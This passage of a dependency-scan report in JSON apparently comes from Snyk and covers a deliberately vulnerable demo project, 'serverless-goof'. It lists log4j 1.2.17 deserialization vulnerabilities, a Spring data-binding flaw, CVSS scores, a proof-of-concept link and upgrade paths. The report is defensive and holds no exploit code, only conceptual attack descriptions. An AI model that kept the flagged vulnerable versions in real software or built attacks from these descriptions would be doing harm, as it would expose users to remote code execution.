Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9)\n",
        "disclosureTime": "2022-01-18T17:22:50Z",
        "exploit": "Not Defined",
        "functions": [],
        "fixedIn": [],
        "id": "SNYK-JAVA-LOG4J-2342647",
        "identifiers": {
          "CWE": [
            "CWE-502"
          ],
          "CVE": [
            "CVE-2022-23302"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-03-27T14:15:25.880692Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-01-18T17:28:19Z",
        "references": [
          {
            "title": "Apache Mailing List",
            "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w"
          },
          {
            "title": "Apache Security Advisory",
            "url": "https://logging.apache.org/log4j/1.2/index.html"
          },
          {
            "title": "Reload4j Fix Commit",
            "url": "https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9"
          }
        ],
        "severity": "high",
        "socialTrendAlert": false,
        "title": "Deserialization of Untrusted Data",
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "from": [
          "serverless-goof:todo@1.0-SNAPSHOT",
          "com.amazonaws:aws-lambda-java-log4j@1.0.0",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "alternativeIds": [],
        "creationTime": "2020-06-18T15:47:31.144561Z",
        "credit": [
          "Marcio Almeida de Macedo"
        ],
        "cvssScore": 9.8,
        "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",
        "disclosureTime": "2019-12-22T09:33:11Z",
        "exploit": "Proof of Concept",
        "functions": [
          {
            "functionId": {
              "filePath": "org/apache/log4j/net/SocketServer.java",
              "className": "SocketServer",
              "functionName": "main"
            },
            "version": [
              "[0,]"
            ]
          }
        ],
        "fixedIn": [],
        "id": "SNYK-JAVA-LOG4J-572732",
        "identifiers": {
          "CWE": [
            "CWE-502"
          ],
          "GHSA": [
            "GHSA-2qrg-x229-3v8q"
          ],
          "CVE": [
            "CVE-2019-17571"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-02-11T15:25:01.017358Z",
        "moduleName": "log4j:log4j",
        "packageManager": "maven",
        "packageName": "log4j:log4j",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2020-06-19T09:33:01Z",
        "references": [
          {
            "title": "Apache Security Advisory",
            "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E"
          },
          {
            "title": "PoC",
            "url": "https://0xsapra.github.io/website/CVE-2019-17571"
          }
        ],
        "severity": "critical",
        "socialTrendAlert": false,
        "title": "Deserialization of Untrusted Data",
        "functions_new": [
          {
            "functionId": {
              "className": "org.apache.log4j.net.SocketServer",
              "functionName": "main"
            },
            "version": [
              "[0,]"
            ]
          }
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "from": [
          "serverless-goof:todo@1.0-SNAPSHOT",
          "com.amazonaws:aws-lambda-java-log4j@1.0.0",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "log4j:log4j",
        "version": "1.2.17",
        "severityWithCritical": "critical"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "alternativeIds": [],
        "creationTime": "2022-04-14T11:54:10.207823Z",
        "credit": [
          "Unknown"
        ],
        "cvssScore": 3.7,
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Handling of Case Sensitivity via the patterns for `disallowedFields` on a `DataBinder`. As a result, a field is not effectively protected unless it is listed with both upper and lower case for the first character of the field, including nested fields within the property path.\n## Remediation\nUpgrade `org.springframework:spring-context` to version 5.2.21, 5.3.19 or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/833e750175349ab4fd502109a8b41af77e25cdea)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/28333)\n- [Spring Blog Post](https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968)\n- [Tanzu Advisory](https://tanzu.vmware.com/security/cve-2022-22968)\n",
        "disclosureTime": "2022-04-14T11:43:54Z",
        "exploit": "Not Defined",
        "functions": [],
        "fixedIn": [
          "5.2.21",
          "5.3.19"
        ],
        "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2689634",
        "identifiers": {
          "CWE": [
            "CWE-178"
          ],
          "CVE": [
            "CVE-2022-22968"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-04-14T12:09:40.109582Z",
        "moduleName": "org.springframework:spring-context",
        "packageManager": "maven",
        "packageName": "org.springframework:spring-context",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-04-14T12:09:40.107275Z",
        "references": [
          {
            "title": "GitHub Commit",
            "url": "https://github.com/spring-projects/spring-framework/commit/833e750175349ab4fd502109a8b41af77e25cdea"
          },
          {
            "title": "GitHub Issue",
            "url": "https://github.com/spring-projects/spring-framework/issues/28333"
          },
          {
            "title": "Spring Blog Post",
            "url": "https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968"
          },
          {
            "title": "Tanzu Advisory",
            "url": "https://tanzu.vmware.com/security/cve-2022-22968"
          }
        ],
        "severity": "low",
        "socialTrendAlert": false,
        "title": "Improper Handling of Case Sensitivity",
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[,5.2.21)",
            "[5.3.0, 5.3.19)"
          ]
        },
        "mavenModuleName": {
          "groupId": "org.springframework",
          "artifactId": "spring-context"
        },
        "from": [
          "serverless-goof:todo@1.0-SNAPSHOT",
          "com.github.derjust:spring-data-dynamodb@4.3.1",
          "org.springframework:spring-context@5.0.6.RELEASE"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.springframework:spring-context",
        "version": "5.0.6.RELEASE",
        "severityWithCritical": "low"
      }
    ],
    "upgrade": {
      "com.amazonaws:aws-java-sdk-dynamodb@1.11.34": {
        "upgradeTo": "com.amazonaws:aws-java-sdk-dynamodb@1.12.213",
        "upgrades": [
          "com.fasterxml.jackson.dataformat:jackson-dataformat-cbor@2.9.5",
          "org.apache.httpcomponents:httpclient@4.5.5"
        ],
        "vulns": [
          "SNYK-JAVA-COMFASTERXMLJACKSONDATAFORMAT-1047329",
          "SNYK-JAVA-ORGAPACHEHTTPCOMPONENTS-1048058"
        ]
      },
      "com.fasterxml.jackson.core:jackson-databind@2.9.3": {
        "upgradeTo": "com.fasterxml.jackson.core:jackson-databind@2.12.6.1",
        "upgrades": [
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3",
          "com.fasterxml.jackson.core:jackson-databind@2.9.3"
        ],
        "vulns": [
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-2421244",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1052449",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1052450",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1054588",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056414",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056416",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056417",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056418",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056419",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056420",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056421",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056424",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056425",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056426",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056427",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1048302",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1061931",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1009829",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-608664",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-570625",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572300",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572314",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572316",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1047324",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-559094",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-560762",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-560766",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561362",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561373",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561585",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561586",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561587",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-564887",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-564888",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-548451",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-559106",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-540500",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-469674",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-469676",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-472980",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467014",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467015",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467016",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-471943",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-455617",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-450207",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-174736",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72882",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72883",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72884",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72448",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72449",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72450",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72451",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72445",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72447",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32111",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72446",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32043",
          "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32044"
        ]
      },
      "com.github.derjust:spring-data-dynamodb@4.3.1": {
        "upgradeTo": "com.github.derjust:spring-data-dynamodb@5.0.3",
        "upgrades": [
          "org.hibernate:hibernate-validator@5.2.4.Final",
          "org.hibernate:hibernate-validator@5.2.4.Final",
          "org.hibernate:hibernate-validator@5.2.4.Final",
          "org.springframework.data:spring-data-commons@1.12.10.RELEASE",
          "org.springframework.data:spring-data-commons@1.12.10.RELEASE"
        ],
        "vulns": [
          "SNYK-JAVA-ORGHIBERNATE-451605",
          "SNYK-JAVA-ORGHIBERNATE-568162",
          "SNYK-JAVA-ORGHIBERNATE-569100",
          "SNYK-JAVA-ORGSPRINGFRAMEWORKDATA-32219",
          "SNYK-JAVA-ORGSPRINGFRAMEWORKDATA-32231"
        ]
      },
      "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2": {
        "upgradeTo": "org.springframework.cloud:spring-cloud-function-adapter-aws@3.1.7",
        "upgrades": [
          "org.springframework.cloud:spring-cloud-function-context@1.0.0.RC2",
          "ch.qos.logback:logback-core@1.2.3",
          "org.springframework:spring-web@5.0.6.RELEASE",
          "org.springframework:spring-web@5.0.6.RELEASE",
          "org.springframework.boot:spring-boot@2.0.2.RELEASE",
          "org.yaml:snakeyaml@1.19",
          "org.springframework:spring-web@5.0.6.RELEASE",
          "org.springframework:spring-web@5.0.6.RELEASE",
          "org.springframework:spring-web@5.0.6.RELEASE",
          "org.springframework:spring-web@5.0.6.RELEASE"
        ],
        "vulns": [
          "SNYK-JAVA-ORGSPRINGFRAMEWORKCLOUD-2436645",
          "SNYK-JAVA-CHQOSLOGBACK-1726923",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-1296829",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-1009832",
          "SNYK-JAVA-ORGSPRINGFRAMEWORKBOOT-2438287",
          "SNYK-JAVA-ORGYAML-537645",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-559346",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-31689",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-451604",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-72470"
        ]
      },
      "org.springframework.data:spring-data-rest-webmvc@2.6.6.RELEASE": {
        "upgradeTo": "org.springframework.data:spring-data-rest-webmvc@3.5.11",
        "upgrades": [
          "org.springframework:spring-beans@5.0.6.RELEASE",
          "org.springframework:spring-expression@5.0.6.RELEASE",
          "org.springframework.data:spring-data-rest-webmvc@2.6.6.RELEASE",
          "org.springframework:spring-webmvc@5.0.6.RELEASE",
          "org.springframework.data:spring-data-rest-webmvc@2.6.6.RELEASE"
        ],
        "vulns": [
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-2434828",
          "SNYK-JAVA-ORGSPRINGFRAMEWORKDATA-1767823",
          "SNYK-JAVA-ORGSPRINGFRAMEWORK-467268",
          "SNYK-JAVA-ORGSPRINGFRAMEWORKDATA-31577"
        ]
      }
    },
    "patch": {},
    "ignore": {},
    "pin": {}
  },
  "filesystemPolicy": false,
  "filtered": {
    "ignore": [],
    "patch": []
  },
  "uniqueCount": 91,
  "projectName": "serverless-goof:todo",
  "displayTargetFile": "pom.xml",
  "path": "/Users/harrykimpel/Projects/demo/java/serverless-spring-goof"
}
